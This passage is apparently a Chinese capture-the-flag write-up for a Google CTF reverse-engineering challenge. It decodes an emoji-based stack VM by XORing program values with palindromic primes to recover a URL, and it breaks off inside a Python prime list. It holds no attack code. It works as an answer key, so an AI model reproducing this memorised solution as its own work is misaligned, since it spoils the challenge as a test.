🔪 😲 📤 🚛 🥇 1️⃣ ✋ 📥 🥇🏀 💰🔶🎌🚩💠🏁 😐📤 🤡 📥 🥇📬 😲 🏀 💰🔶🎌🚩💠🏁 😐📤 🤡 📥 🥇 🚛 🥇 1️⃣ ✋📥 🥇 🍡 🤡 🍿 🥇 🏀 💰🎌🚩💠🔶🏁🖋🎌🏁💠🔶🚩🤡 🤡 🚛 🥈 0️⃣ ✋ 📥 🥈🖋🏁💠🔶🚩🎌 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇⭐ 🍿 🥈 📥 🥇 📬📥 🥈 🍡 🍿 🥈 🍿 🥇 🤡 📥 🥈 🔪😲 📤 🚛 🥈 1️⃣ ✋ 📥 🥈 🏀 💰🎌🏁🚩🔶💠 😐📤 📥 🥇 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇 📐😲 🏀 💰🎌🏁🚩🔶💠 😐🤡 📥 🥈 🏀 💰🏁💠🔶🚩🎌</code></pre><ul><li>尝试使用vm.py将program 转换成代码形式，速度太慢，应该是一个错误的思路</li></ul><pre class="language-sh" data-language="sh"><code class="language-sh">╭─r10@GSCR10 &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;R10&#x2F;Desktop&#x2F;google ctf&#x2F;ctf&#x2F;06_FriendSpaceBookPlusAllAccessRedPremium.com╰─➤  python3 vm.py programRunning ....http:&#x2F;&#x2F;emoji-t0anaxnr3nacpt4n</code></pre><ul><li>分析vm.py,实现了基于堆栈的相关算法。</li><li>分析得到rom为输入数据，从program中获取，分为3段</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">[0，1️7️4️8️8️, 1️6️7️5️8️, 1️6️5️9️9️, 1️6️2️8️5️, 1️6️0️9️4️, 1️5️5️0️5️, 1️5️4️1️7️, 1️4️8️3️2️, 1️4️4️5️0️, 1️3️8️9️3️, 1️3️9️2️6️, 1️3️4️3️7️, 1️2️8️3️3️, 1️2️7️4️1️, 1️2️5️3️3️, 1️1️5️0️4️, 1️1️3️4️2️, 1️0️5️0️3️, 1️0️5️5️0️, 1️0️3️1️9️, 9️7️5️, 1️0️0️7️, 8️9️2️, 8️9️3️, 6️6️0️, 7️4️3️, 2️6️7️, 3️4️4️, 2️6️4️, 3️3️9️, 2️0️8️, 2️1️6️, 2️4️2️, 1️7️2, 7️4, 4️9️, 1️1️9️, 1️1️3️, 1️1️9️, 1️06, 1️ ][9️8️4️2️6️, 9️7️8️5️0️, 9️7️6️0️4️, 9️7️2️8️0️, 9️6️8️1️5️, 9️6️4️4️3️, 9️6️3️5️4️, 9️5️9️3️4️, 9️4️8️6️5️, 9️4️9️5️2️, 9️4️6️6️9️, 9️4️4️4️0️, 9️3️9️6️9️, 9️3️7️6️6, 9️9][1️0️1️1️4️1️0️5️8️, 1️0️1️0️6️0️2️0️6️, 1️0️1️0️3️0️0️5️5️, 1️0️0️9️9️8️9️6️6️, 1️0️0️8️8️7️9️9️0️, 1️0️0️7️6️7️0️8️5️, 1️0️0️7️0️7️0️3️6️, 1️0️0️6️5️6️1️1️1️, 1️0️0️4️0️4️0️9️4️, 1️0️0️1️6️0️9️2️2️, 1️0️0️1️3️1️0️1️9️, 1️0️0️1️1️1️1️0️0️, 1️0️0️0️5️9️9️2️6️, 1️0️0️0️4️9️9️8️2️, 1️0️0️0️3️0️0️4️5️, 9️9️8️9️9️9️7️, 9️9️8️1️8️5️8️, 9️9️8️0️8️1️5️, 9️9️7️8️8️4️2️, 9️9️6️5️7️9️4️, 9️9️5️7️5️6️4️, 9️9️3️8️3️0️4️, 9️9️3️5️4️2️7️, 9️9️3️2️2️8️9️, 9️9️3️1️4️9️4️, 9️9️2️7️3️8️8️, 9️9️2️6️3️7️6️, 9️9️2️3️2️1️3️, 9️9️2️1️3️9️4️, 9️9️1️9️1️5️4️, 9️9️1️8️0️8️2️, 9️9️1️6️2️3️9️, 7️6️5️]</code></pre><ul><li>通过答应vm.print_top()可以看到输出结果是连个数字xor,转为chr，与初始执行得到的的<code>http://...</code>一致，对打印结果进行整理</li></ul><pre class="language-txt" data-language="txt"><code class="language-txt">in: 106         key: 2          chr: 104        out: hin: 119         key: 3          chr: 116        out: tin: 113         key: 5          chr: 116        out: tin: 119         key: 7          chr: 112        out: pin: 49          key: 11         chr: 58         out: :in: 74          key: 101        chr: 47         out: &#x2F;in: 172         key: 131        chr: 47         out: &#x2F;in: 242         key: 151        chr: 101        out: ein: 216         key: 181        chr: 109        out: min: 208         key: 191        chr: 111        out: oin: 339         key: 313        chr: 106        out: jin: 264         key: 353        chr: 105        out: iin: 344         key: 373        chr: 45         out: -in: 267         key: 383        chr: 116        out: tin: 743         key: 727        chr: 48         out: 0in: 660         key: 757        chr: 97         out: ain: 893         key: 787        chr: 110        out: nin: 892         key: 797        chr: 97         out: ain: 1007        key: 919        chr: 120        out: xin: 975         key: 929        chr: 110        out: nin: 10319       key: 10301      chr: 114        out: rin: 10550       key: 10501      chr: 51         out: 3in: 10504       key: 10601      chr: 97         out: ain: 11342       key: 11311      chr: 97         out: ain: 11503       key: 11411      chr: 124        out: |in: 12533       key: 12421      chr: 112        out: pin: 12741       key: 12721      chr: 116        out: tin: 12833       key: 12821      chr: 52         out: 4</code></pre><ul><li>分析看到key为回文数，通过google,在<a href="https://oeis.org/">https://oeis.org/</a>找到序列标记为A002385</li><li>输入list 的最后一个数字表示，从第几个回文数开始计算</li><li>编写脚本将program中的输入与A002385中的数xor</li></ul><pre class="language-python" data-language="python"><code class="language-python">primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">313</span><span class="token punctuation">,</span> <span class="token number">353</span><span class="token punctuation">,</span> <span class="token number">373</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">,</span> <span class="token number">727</span><span class="token punctuation">,</span> <span class="token number">757</span><span class="token punctuation">,</span> <span class="token number">787</span><span class="token punctuation">,</span> <span class="token number">797</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">929</span><span class="token punctuation">,</span> <span class="token number">10301</span><span class="token punctuation">,</span> <span class="token number">10501</span><span class="token punctuation">,</span> <span class="token number">10601</span><span class="token punctuation">,</span> <span class="token number">11311</span><span class="token punctuation">,</span> <span class="token number">11411</span><span class="token punctuation">,</span> <span class="token number">12421</span><span class="token punctuation">,</span> <span class="token number">12721</span><span class="token punctuation">,</span> <span class="token number">12821</span><span class="token punctuation">,</span> <span class="token number">13331</span><span class="token punctuation">,</span> <span class="token number">13831</span><span class="token punctuation">,</span> <span class="token number">13931</span><span class="token punctuation">,</span> <span class="token number">14341</span><span class="token punctuation">,</span> <span class="token number">14741</span><span class="token punctuation">,</span> <span class="token number">15451</span><span class="token punctuation">,</span> <span class="token number">15551</span><span class="token punctuation">,</span> <span class="token number">16061</span><span class="token punctuation">,</span> <span class="token number">16361</span><span class="token punctuation">,</span> <span class="token number">16561</span><span class="token punctuation">,</span> <span class="token number">16661</span><span class="token punctuation">,</span> <span class="token number">17471</span><span class="token punctuation">,</span> <span class="token number">17971</span><span class="token punctuation">,</span> <span class="token number">18181</span><span class="token punctuation">,</span> <span class="token number">18481</span><span class="token punctuation">,</span> <span class="token number">19391</span><span class="token punctuation">,</span> <span class="token number">19891</span><span class="token punctuation">,</span> <span class="token number">19991</span><span class="token punctuation">,</span> <span class="token number">30103</span><span class="token punctuation">,</span> <span class="token number">30203</span><span class="token punctuation">,</span> <span class="token number">30403</span><span class="token punctuation">,</span> <span class="token number">30703</span><span class="token punctuation">,</span> <span class="token number">30803</span><span class="token punctuation">,</span> <span class="token number">31013</span><span class="token punctuation">,</span> <span class="token number">31513</span><span class="token punctuation">,</span> <span class="token number">32323</span><span class="token punctuation">,</span> <span class="token number">32423</span><span class="token punctuation">,</span> <span class="token number">33533</span><span class="token punctuation">,</span> <span class="token number">34543</span><span class="token punctuation">,</span> <span class="token number">34843</span><span class="token punctuation">,</span> <span class="token number">35053</span><span class="token punctuation">,</span> <span class="token number">35153</span><span class="token punctuation">,</span> <span class="token number">35353</span><span class="token punctuation">,</span> <span class="token number">35753</span><span class="token punctuation">,</span> <span class="token number">36263</span><span class="token punctuation">,</span> <span class="token number">36563</span><span class="token punctuation">,</span> <span class="token number">37273</span><span class="token punctuation">,</span> <span class="token number">37573</span><span class="token punctuation">,</span> <span class="token number">38083</span><span class="token punctuation">,</span> <span class="token number">38183</span><span class="token punctuation">,</span> <span class="token number">38783</span><span class="token punctuation">,</span> <span class="token number">39293</span><span class="token punctuation">,</span> <span class="token number">70207</span><span class="token punctuation">,</span> <span class="token number">70507</span><span class="token punctuation">,</span> <span class="token number">70607</span><span class="token punctuation">,</span> <span class="token number">71317</span><span class="token punctuation">,</span> <span class="token number">71917</span><span class="token punctuation">,</span> <span class="token number">72227</span><span class="token punctuation">,</span> <span class="token number">72727</span><span class="token punctuation">,</span> <span class="token number">73037</span><span class="token punctuation">,</span> <span class="token number">73237</span><span class="token punctuation">,</span> <span class="token number">73637</span><span class="token punctuation">,</span> <span class="token number">74047</span><span class="token punctuation">,</span> <span class="token number">74747</span><span class="token punctuation">,</span> <span class="token number">75557</span><span class="token punctuation">,</span> <span class="token number">76367</span><span class="token punctuation">,</span> <span class="token number">76667</span><span class="token punctuation">,</span> <span class="token number">77377</span><span class="token punctuation">,</span> <span class="token number">77477</span><span class="token punctuation">,</span> <span class="token number">77977</span><span class="token punctuation">,</span> <span class="token number">78487</span><span class="token punctuation">,</span> <span class="token number">78787</span><span class="token punctuation">,</span> <span class="token number">78887</span><span class="token punctuation">,</span> <span class="token number">79397</span><span class="token punctuation">,</span> <span class="token number">79697</span><span class="token punctuation">,</span> <span class="token number">79997</span><span class="token punctuation">,</span> <span class="token number">90709</span><span class="token punctuation">,</span> <span class="token number">91019</span><span class="token punctuation">,</span> <span class="token number">93139</span><span class="token punctuation">,</span> <span class="token number">93239</span><span class="token punctuation">,</span> <span class="token number">93739</span><span class="token punctuation">,</span> <span class="token number">94049</span><span class="token punctuation">,</span> <span class="token number">94349</span><span class="token punctuation">,</span> <span class="token number">94649</span><span class="token punctuation">,</span> <span class="token number">94849</span><span class="token punctuation">,</span> <span class="token number">94949</span><span class="token punctuation">,</span> <span class="token number">95959</span><span class="token punctuation">,</span> <span class="token number">96269</span><span class="token punctuation">,</span> <span class="token number">96469</span><span class="token punctuation">,</span> <span class="token number">96769</span><span class="token punctuation">,</span> <span class="token number">97379</span><span class="token punctuation">,</span> <span class="token number">97579</span><span class="token punctuation">,</span> <span class="token number">97879</span><span class="token punctuation">,</span> <span class="token number">98389</span><span class="token punctuation">,</span> <span class="token number">98689</span><span class="token punctuation">,</span> <span class="token number">1003001</span><span class="token punctuation">,</span> <span class="token number">1008001</span><span class="token punctuation">,</span> <span class="token number">1022201</span><span class="token punctuation">,</span> <span class="token number">1028201</span><span class="token punctuation">,</span> <span class="token number">1035301</span><span class="token punctuation">,</span> <span class="token number">1043401</span><span class="token punctuation">,</span> <span class="token number">1055501</span><span class="token punctuation">,</span> <span class="token number">1062601</span><span class="token punctuation">,</span> <span class="token number">1065601</span><span class="token punctuation">,</span> <span class="token number">1074701</span><span class="token punctuation">,</span> <span class="token number">1082801</span><span class="token punctuation">,</span> <span class="token number">1085801</span><span class="token punctuation">,</span> <span class="token number">1092901</span><span class="token punctuation">,</span> <span class="token number">1093901</span><span class="token punctuation">,</span> <span class="token number">1114111</span><span class="token punctuation">,</span> <span class="token number">1117111</span><span class="token punctuation">,</span> <span class="token number">1120211</span><span class="token punctuation">,</span> <span class="token number">1123211</span><span class="token punctuation">,</span> <span class="token number">1126211</span><span class="token punctuation">,</span> <span class="token number">1129211</span><span class="token punctuation">,</span> <span class="token number">1134311</span><span class="token punctuation">,</span> <span class="token number">1145411</span><span class="token punctuation">,</span> <span class="token number">1150511</span><span class="token punctuation">,</span> <span class="token number">1153511</span><span class="token punctuation">,</span> <span class="token number">1160611</span><span class="token punctuation">,</span> <span class="token number">1163611</span><span class="token punctuation">,</span> <span class="token number">1175711</span><span class="token punctuation">,</span> <span class="token number">1177711</span><span class="token punctuation">,</span> <span class="token number">1178711</span><span class="token punctuation">,</span> <span class="token number">1180811</span><span class="token punctuation">,</span> <span class="token number">1183811</span><span class="token punctuation">,</span> <span class="token number">1186811</span><span class="token punctuation">,</span> <span class="token number">1190911</span><span class="token punctuation">,</span> <span class="token number">1193911</span><span class="token punctuation">,</span> <span class="token number">1196911</span><span class="token punctuation">,</span> <span class="token number">1201021</span><span class="token punctuation">,</span> <span class="token number">1208021</span><span class="token punctuation">,</span> <span class="token number">1212121</span><span class="token punctuation">,</span> <span class="token number">1215121</span><span class="token punctuation">,</span> <span class="token number">1218121</span><span class="token punctuation">,</span> <span class="token number">1221221</span><span class="token punctuation">,</span> <span class="token number">1235321</span><span class="token punctuation">,</span> <span class="token number">1242421</span><span class="token punctuation">,</span> <span class="token number">1243421</span><span class="token punctuation">,</span> <span class="token number">1245421</span><span class="token punctuation">,</span> <span class="token number">1250521</span><span class="token punctuation">,</span> <span class="token number">1253521</span><span class="token punctuation">,</span> <span class="token number">1257521</span><span class="token punctuation">,</span> <span class="token number">1262621</span><span class="token punctuation">,</span> <span class="token number">1268621</span><span class="token punctuation">,</span> <span class="token number">1273721</span><span class="token punctuation">,</span> <span class="token number">1276721</span><span class="token punctuation">,</span> <span class="token number">1278721</span><span class="token punctuation">,</span> <span class="token number">1280821</span><span class="token punctuation">,</span> <span class="token number">1281821</span><span class="token punctuation">,</span> <span class="token number">1286821</span><span class="token punctuation">,</span> <span class="token number">1287821</span><span class="token punctuation">,</span> <span class="token number">1300031</span><span class="token punctuation">,</span> <span class="token number">1303031</span><span class="token punctuation">,</span> <span class="token number">1311131</span><span class="token punctuation">,</span> <span class="token number">1317131</span><span class="token punctuation">,</span> <span class="token number">1327231</span><span class="token punctuation">,</span> <span class="token number">1328231</span><span class="token punctuation">,</span> <span class="token number">1333331</span><span class="token punctuation">,</span> <span class="token number">1335331</span><span class="token punctuation">,</span> <span class="token number">1338331</span><span class="token punctuation">,</span> <span class="token number">1343431</span><span class="token punctuation">,</span> <span class="token number">1360631</span><span class="token punctuation">,</span> <span class="token number">1362631</span><span class="token punctuation">,</span> <span class="token number">1363631</span><span class="token punctuation">,</span> <span class="token number">1371731</span><span class="token punctuation">,</span> <span class="token number">1374731</span><span class="token punctuation">,</span> <span class="token number">1390931</span><span class="token punctuation">,</span> <span class="token number">1407041</span><span class="token punctuation">,</span> <span class="token number">1409041</span><span class="token punctuation">,</span> <span class="token number">1411141</span><span class="token punctuation">,</span> <span class="token number">1412141</span><span class="token punctuation">,</span> <span class="token number">1422241</span><span class="token punctuation">,</span> <span class="token number">1437341</span><span class="token punctuation">,</span> <span class="token number">1444441</span><span class="token punctuation">,</span> <span class="token number">1447441</span><span class="token punctuation">,</span> <span class="token number">1452541</span><span class="token punctuation">,</span> <span class="token number">1456541</span><span class="token punctuation">,</span> <span class="token number">1461641</span><span class="token punctuation">,</span> <span class="token number">1463641</span><span class="token punctuation">,</span> <span class="token number">1464641</span><span class="token punctuation">,</span> <span class="token number">1469641</span><span class="token punctuation">,</span> <span class="token number">1486841</span><span class="token punctuation">,</span> <span class="token number">1489841</span><span class="token punctuation">,</span> <span class="token number">1490941</span><span class="token punctuation">,</span> <span class="token number">1496941</span><span class="token punctuation">,</span> <span class="token number">1508051</span><span class="token punctuation">,</span> <span class="token number">1513151</span><span class="token punctuation">,</span> <span class="token number">1520251</span><span class="token punctuation">,</span> <span class="token number">1532351</span><span class="token punctuation">,</span> <span class="token number">1535351</span><span class="token punctuation">,</span> <span class="token number">1542451</span><span class="token punctuation">,</span> <span class="token number">1548451</span><span class="token punctuation">,</span> <span class="token number">1550551</span><span class="token punctuation">,</span> <span class="token number">1551551</span><span class="token punctuation">,</span> <span class="token number">1556551</span><span class="token punctuation">,</span> <span class="token number">1557551</span><span class="token punctuation">,</span> <span class="token number">1565651</span><span class="token punctuation">,</span> <span class="token number">1572751</span><span class="token punctuation">,</span> <span class="token number">1579751</span><span class="token punctuation">,</span> <span class="token number">1580851</span><span class="token punctuation">,</span> <span class="token number">1583851</span><span class="token punctuation">,</span> <span class="token number">1589851</span><span class="token punctuation">,</span> <span class="token number">1594951</span><span class="token punctuation">,</span> <span class="token number">1597951</span><span class="token punctuation">,</span> <span class="token number">1598951</span><span class="token punctuation">,</span> <span class="token number">1600061</span><span class="token punctuation">,</span> <span class="token number">1609061</span><span class="token punctuation">,</span> <span class="token number">1611161</span><span class="token punctuation">,</span> <span class="token number">1616161</span><span class="token punctuation">,</span> <span class="token number">1628261</span><span class="token punctuation">,</span> <span class="token number">1630361</span><span class="token punctuation">,</span> <span class="token number">1633361</span><span class="token punctuation">,</span> <span class="token number">1640461</span><span class="token punctuation">,</span> <span class="token number">1643461</span><span class="token punctuation">,</span> <span class="token number">1646461</span><span class="token punctuation">,</span> <span class="token number">1654561</span><span class="token punctuation">,</span> <span class="token number">1657561</span><span class="token punctuation">,</span> <span class="token number">1658561</span><span class="token punctuation">,</span> <span class="token number">1660661</span><span class="token punctuation">,</span> <span class="token number">1670761</span><span class="token punctuation">,</span> <span class="token number">1684861</span><span class="token punctuation">,</span> <span class="token number">1685861</span><span class="token punctuation">,</span> <span class="token number">1688861</span><span class="token punctuation">,</span> <span class="token number">1695961</span><span class="token punctuation">,</span> <span class="token number">1703071</span><span class="token punctuation">,</span> <span class="token number">1707071</span><span class="token punctuation">,</span> <span class="token number">1712171</span><span class="token punctuation">,</span> <span class="token number">1714171</span><span class="token punctuation">,</span> <span class="token number">1730371</span><span class="token punctuation">,</span> <span class="token number">1734371</span><span class="token punctuation">,</span> <span class="token number">1737371</span><span class="token punctuation">,</span> <span class="token number">1748471</span><span class="token punctuation">,</span> <span class="token number">1755571</span><span class="token punctuation">,</span> <span class="token number">1761671</span><span class="token punctuation">,</span> <span class="token number">1764671</span><span class="token punctuation">,</span> <span class="token number">1777771</span><span class="token punctuation">,</span> <span class="token number">1793971</span><span class="token punctuation">,</span> <span class="token number">1802081</span><span class="token punctuation">,</span> <span class="token number">1805081</span><span class="token punctuation">,</span> <span class="token number">1820281</span><span class="token punctuation">,</span> <span class="token number">1823281</span><span class="token punctuation">,</span> <span class="token number">1824281</span><span class="token punctuation">,</span> <span class="token number">1826281</span><span class="token punctuation">,</span> <span class="token number">1829281</span><span class="token punctuation">,</span> <span class="token number">1831381</span><span class="token punctuation">,</span> <span class="token number">1832381</span><span class="token punctuation">,</span> <span class="token number">1842481</span><span class="token punctuation">,</span> <span class="token number">1851581</span><span class="token punctuation">,</span> <span class="token number">1853581</span><span class="token punctuation">,</span> <span class="token number">1856581</span><span class="token punctuation">,</span> <span class="token number">1865681</span><span class="token punctuation">,</span> <span class="token number">1876781</span><span class="token punctuation">,</span> <span class="token number">1878781</span><span class="token punctuation">,</span> <span class="token number">1879781</span><span class="token punctuation">,</span> <span class="token number">1880881</span><span class="token punctuation">,</span> <span class="token number">1881881</span><span class="token punctuation">,</span> <span class="token number">1883881</span><span class="token punctuation">,</span> <span class="token number">1884881</span><span class="token punctuation">,</span> <span class="token number">1895981</span><span class="token punctuation">,</span> <span class="token number">1903091</span><span class="token punctuation">,</span> <span class="token number">1908091</span><span class="token punctuation">,</span> <span class="token number">1909091</span><span class="token punctuation">,</span> <span class="token number">1917191</span><span class="token punctuation">,</span> <span class="token number">1924291</span><span class="token punctuation">,</span> <span class="token number">1930391</span><span class="token punctuation">,</span> <span class="token number">1936391</span><span class="token punctuation">,</span> <span class="token number">1941491</span><span class="token punctuation">,</span> <span class="token number">1951591</span><span class="token punctuation">,</span> <span class="token number">1952591</span><span class="token punctuation">,</span> <span class="token number">1957591</span><span class="token punctuation">,</span> <span class="token number">1958591</span><span class="token punctuation">,</span> <span class="token number">1963691</span><span class="token punctuation">,</span> <span class="token number">1968691</span><span class="token punctuation">,</span> <span class="token number">1969691</span><span class="token punctuation">,</span> <span class="token number">1970791</span><span class="token punctuation">,</span> <span class="token number">1976791</span><span class="token punctuation">,</span> <span class="token number">1981891</span><span class="token punctuation">,</span> <span class="token number">1982891</span><span class="token punctuation">,</span> <span class="token number">1984891</span><span class="token punctuation">,</span> <span class="token number">1987891</span><span class="token punctuation">,</span> <span class="token number">1988891</span><span class="token punctuation">,</span> <span class="token number">1993991</span><span class="token punctuation">,</span> <span class="token number">1995991</span><span class="token punctuation">,</span> <span class="token number">1998991</span><span class="token punctuation">,</span> <span class="token number">3001003</span><span class="token punctuation">,</span> <span class="token number">3002003</span><span class="token punctuation">,</span> <span class="token number">3007003</span><span class="token punctuation">,</span> <span class="token number">3016103</span><span class="token punctuation">,</span> <span class="token number">3026203</span><span class="token punctuation">,</span> <span class="token number">3064603</span><span class="token punctuation">,</span> <span class="token number">3065603</span><span class="token punctuation">,</span> <span class="token number">3072703</span><span class="token punctuation">,</span> <span class="token number">3073703</span><span class="token punctuation">,</span> <span class="token number">3075703</span><span class="token punctuation">,</span> <span class="token number">3083803</span><span class="token punctuation">,</span> <span class="token number">3089803</span><span class="token punctuation">,</span> <span class="token number">3091903</span><span class="token punctuation">,</span> <span class="token number">3095903</span><span class="token punctuation">,</span> <span class="token number">3103013</span><span class="token punctuation">,</span> <span class="token number">3106013</span><span class="token punctuation">,</span> <span class="token number">3127213</span><span class="token punctuation">,</span> <span class="token number">3135313</span><span class="token punctuation">,</span> <span class="token number">3140413</span><span class="token punctuation">,</span> <span class="token number">3155513</span><span class="token punctuation">,</span> <span class="token number">3158513</span><span class="token punctuation">,</span> <span class="token number">3160613</span><span class="token punctuation">,</span> <span class="token number">3166613</span><span class="token punctuation">,</span> <span class="token number">3181813</span><span class="token punctuation">,</span> <span class="token number">3187813</span><span class="token punctuation">,</span> <span class="token number">3193913</span><span class="token punctuation">,</span> <span class="token number">3196913</span><span class="token punctuation">,</span> <span class="token number">3198913</span><span class="token punctuation">,</span> <span class="token number">3211123</span><span class="token punctuation">,</span> <span class="token number">3212123</span><span class="token punctuation">,</span> <span class="token number">3218123</span><span class="token punctuation">,</span> <span class="token number">3222223</span><span class="token punctuation">,</span> <span class="token number">3223223</span><span class="token punctuation">,</span> <span class="token number">3228223</span><span class="token punctuation">,</span> <span class="token number">3233323</span><span class="token punctuation">,</span> <span class="token number">3236323</span><span class="token punctuation">,</span> <span class="token number">3241423</span><span class="token punctuation">,</span> <span class="token number">3245423</span><span class="token punctuation">,</span> <span class="token number">3252523</span><span class="token punctuation">,</span> <span class="token number">3256523</span><span class="token punctuation">,</span> <span class="token number">3258523</span><span class="token punctuation">,</span> <span class="token number">3260623</span><span class="token punctuation">,</span> <span class="token number">3267623</span><span class="token punctuation">,</span> <span class="token number">3272723</span><span class="token punctuation">,</span> <span class="token number">3283823</span><span class="token punctuation">,</span> <span class="token number">3285823</span><span class="token punctuation">,</span> <span class="token number">3286823</span><span class="token punctuation">,</span> <span class="token number">3288823</span><span class="token punctuation">,</span> <span class="token number">3291923</span><span class="token punctuation">,</span> <span class="token number">3293923</span><span class="token punctuation">,</span> <span class="token number">3304033</span><span class="token punctuation">,</span> <span class="token number">3305033</span><span class="token punctuation">,</span> <span class="token number">3307033</span><span class="token punctuation">,</span> <span class="token number">3310133</span><span class="token punctuation">,</span> <span class="token number">3315133</span><span class="token punctuation">,</span> <span class="token number">3319133</span><span class="token punctuation">,</span> <span class="token number">3321233</span><span class="token punctuation">,</span> <span class="token number">3329233</span><span class="token punctuation">,</span> <span class="token number">3331333</span><span class="token punctuation">,</span> <span class="token number">3337333</span><span class="token punctuation">,</span> <span class="token number">3343433</span><span class="token punctuation">,</span> <span class="token number">3353533</span><span class="token punctuation">,</span> <span class="token number">3362633</span><span class="token punctuation">,</span> <span class="token number">3364633</span><span class="token punctuation">,</span> <span class="token number">3365633</span><span class="token punctuation">,</span> <span class="token number">3368633</span><span class="token punctuation">,</span> <span class="token number">3380833</span><span class="token punctuation">,</span> <span class="token number">3391933</span><span class="token punctuation">,</span> <span class="token number">3392933</span><span class="token punctuation">,</span> <span class="token number">3400043</span><span class="token punctuation">,</span> <span class="token number">3411143</span><span class="token punctuation">,</span> <span class="token number">3417143</span><span class="token punctuation">,</span> <span class="token number">3424243</span><span class="token punctuation">,</span> <span class="token number">3425243</span><span class="token punctuation">,</span> <span class="token number">3427243</span><span class="token punctuation">,</span> <span class="token number">3439343</span><span class="token punctuation">,</span> <span class="token number">3441443</span><span class="token punctuation">,</span> <span class="token number">3443443</span><span class="token punctuation">,</span> <span class="token number">3444443</span><span class="token punctuation">,</span> <span class="token number">3447443</span><span class="token punctuation">,</span> <span class="token number">3449443</span><span class="token punctuation">,</span> <span class="token number">3452543</span><span class="token punctuation">,</span> <span class="token number">3460643</span><span class="token punctuation">,</span> <span class="token number">3466643</span><span class="token punctuation">,</span> <span class="token number">3470743</span><span class="token punctuation">,</span> <span class="token number">3479743</span><span class="token punctuation">,</span> <span class="token number">3485843</span><span class="token punctuation">,</span> <span class="token number">3487843</span><span class="token punctuation">,</span> <span class="token number">3503053</span><span class="token punctuation">,</span> <span class="token number">3515153</span><span class="token punctuation">,</span> <span class="token number">3517153</span><span class="token punctuation">,</span> <span class="token number">3528253</span><span class="token punctuation">,</span> <span class="token number">3541453</span><span class="token punctuation">,</span> <span class="token number">3553553</span><span class="token punctuation">,</span> <span class="token number">3558553</span><span class="token punctuation">,</span> <span class="token number">3563653</span><span class="token punctuation">,</span> <span class="token number">3569653</span><span class="token punctuation">,</span> <span class="token number">3586853</span><span class="token punctuation">,</span> <span class="token number">3589853</span><span class="token punctuation">,</span> <span class="token number">3590953</span><span class="token punctuation">,</span> <span class="token number">3591953</span><span class="token punctuation">,</span> <span class="token number">3594953</span><span class="token punctuation">,</span> <span class="token number">3601063</span><span class="token punctuation">,</span> <span class="token number">3607063</span><span class="token punctuation">,</span> <span class="token number">3618163</span><span class="token punctuation">,</span> <span class="token number">3621263</span><span class="token punctuation">,</span> <span class="token number">3627263</span><span class="token punctuation">,</span> <span class="token number">3635363</span><span class="token punctuation">,</span> <span class="token number">3643463</span><span class="token punctuation">,</span> <span class="token number">3646463</span><span class="token punctuation">,</span> <span class="token number">3670763</span><span class="token punctuation">,</span> <span class="token number">3673763</span><span class="token punctuation">,</span> <span class="token number">3680863</span><span class="token punctuation">,</span> <span class="token number">3689863</span><span class="token punctuation">,</span> <span class="token number">3698963</span><span class="token punctuation">,</span> <span class="token number">3708073</span><span class="token punctuation">,</span> <span class="token number">3709073</span><span class="token punctuation">,</span> <span class="token number">3716173</span><span class="token punctuation">,</span> <span class="token number">3717173</span><span class="token punctuation">,</span> <span class="token number">3721273</span><span class="token punctuation">,</span> <span class="token number">3722273</span><span class="token punctuation">,</span> <span class="token number">3728273</span><span class="token punctuation">,</span> <span class="token number">3732373</span><span class="token punctuation">,</span> <span class="token number">3743473</span><span class="token punctuation">,</span> <span class="token number">3746473</span><span class="token punctuation">,</span> <span class="token number">3762673</span><span class="token punctuation">,</span> <span class="token number">3763673</span><span class="token punctuation">,</span> <span class="token number">3765673</span><span class="token punctuation">,</span> <span class="token number">3768673</span><span class="token punctuation">,</span> <span class="token number">3769673</span><span class="token punctuation">,</span> <span class="token number">3773773</span><span class="token punctuation">,</span> <span class="token number">3774773</span><span class="token punctuation">,</span> <span class="token number">3781873</span><span class="token punctuation">,</span> <span class="token number">3784873</span><span class="token punctuation">,</span> <span class="token number">3792973</span><span class="token punctuation">,</span> <span class="token number">3793973</span><span class="token punctuation">,</span> <span class="token number">3799973</span><span class="token punctuation">,</span> <span class="token number">3804083</span><span class="token punctuation">,</span> <span class="token number">3806083</span><span class="token punctuation">,</span> <span class="token number">3812183</span><span class="token punctuation">,</span> <span class="token number">3814183</span><span class="token punctuation">,</span> <span class="token number">3826283</span><span class="token punctuation">,</span> <span class="token number">3829283</span><span class="token punctuation">,</span> <span class="token number">3836383</span><span class="token punctuation">,</span> <span class="token number">3842483</span><span class="token punctuation">,</span> <span class="token number">3853583</span><span class="token punctuation">,</span> <span class="token number">3858583</span><span class="token punctuation">,</span> <span class="token number">3863683</span><span class="token punctuation">,</span> <span class="token number">3864683</span><span class="token punctuation">,</span> <span class="token number">3867683</span><span class="token punctuation">,</span> <span class="token number">3869683</span><span class="token punctuation">,</span> <span class="token number">3871783</span><span class="token punctuation">,</span> <span class="token number">3878783</span><span class="token punctuation">,</span> <span class="token number">3893983</span><span class="token punctuation">,</span> <span class="token number">3899983</span><span class="token punctuation">,</span> <span class="token number">3913193</span><span class="token punctuation">,</span> <span class="token number">3916193</span><span class="token punctuation">,</span> <span class="token number">3918193</span><span class="token punctuation">,</span> <span class="token number">3924293</span><span class="token punctuation">,</span> <span class="token number">3927293</span><span class="token punctuation">,</span> <span class="token number">3931393</span><span class="token punctuation">,</span> <span class="token number">3938393</span><span class="token punctuation">,</span> <span class="token number">3942493</span><span class="token punctuation">,</span> <span class="token number">3946493</span><span class="token punctuation">,</span> <span class="token number">3948493</span><span class="token punctuation">,</span> <span class="token number">3964693</span><span class="token punctuation">,</span> <span class="token number">3970793</span><span class="token punctuation">,</span> <span class="token number">3983893</span><span class="token punctuation">,</span> <span class="token number">3991993</span><span class="token punctuation">,</span> <span class="token number">3994993</span><span class="token punctuation">,</span> <span class="token number">3997993</span><span class="token punctuation">,</span> <span 